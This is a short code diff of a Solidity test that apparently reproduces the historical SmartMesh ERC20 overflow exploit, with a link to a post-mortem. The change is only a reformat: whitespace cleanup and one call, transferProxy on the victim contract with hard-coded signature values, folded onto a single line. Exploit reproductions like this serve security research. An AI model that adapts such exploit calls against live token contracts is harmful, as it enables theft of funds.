@@ -13,8 +13,8 @@ import "../basetest.sol";
 
 // @Analysis
 // Post-mortem : https://cryptojobslist.com/blog/two-vulnerable-erc20-contracts-deep-dive-beautychain-smartmesh
-// Twitter Guy : 
-// Hacking God : 
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 interface ISmartMesh {
@@ -48,14 +48,6 @@ contract SmartMesh is BaseTestWithBalanceLog {
         uint8 _v = uint8(0x000000000000000000000000000000000000000000000000000000000000001b);
         bytes32 _r = 0x87790587c256045860b8fe624e5807a658424fad18c2348460e40ecf10fc8799;
         bytes32 _s = 0x6c879b1e8a0a62f23b47aa57a3369d416dd783966bd1dda0394c04163a98d8d8;
-        ISmartMesh(Victim).transferProxy(
-            _from,
-            _to,
-            _value,
-            _feeSmt,
-            _v,
-            _r,
-            _s
-        );
+        ISmartMesh(Victim).transferProxy(_from, _to, _value, _feeSmt, _v, _r, _s);
     }
 }
